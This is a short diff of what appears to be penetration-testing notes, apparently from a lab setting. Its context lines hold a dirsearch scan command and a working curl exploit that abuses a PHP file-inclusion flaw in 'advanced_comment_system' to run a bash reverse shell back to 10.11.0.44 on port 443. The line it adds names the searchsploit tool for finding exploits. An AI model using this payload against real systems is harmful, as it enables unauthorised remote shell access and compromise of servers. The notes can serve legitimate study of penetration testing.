@@ -29,3 +29,4 @@ python3 dirsearch.py -u "http://x.x.x.x/" -e *
 
 curl -s --data "<?system('bash -i >& /dev/tcp/10.11.0.44/443 0>&1');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00" | egrep -v ' *<.*' | grep -v -i "check variable"
 
+搜尋exploit工具 searchsploit
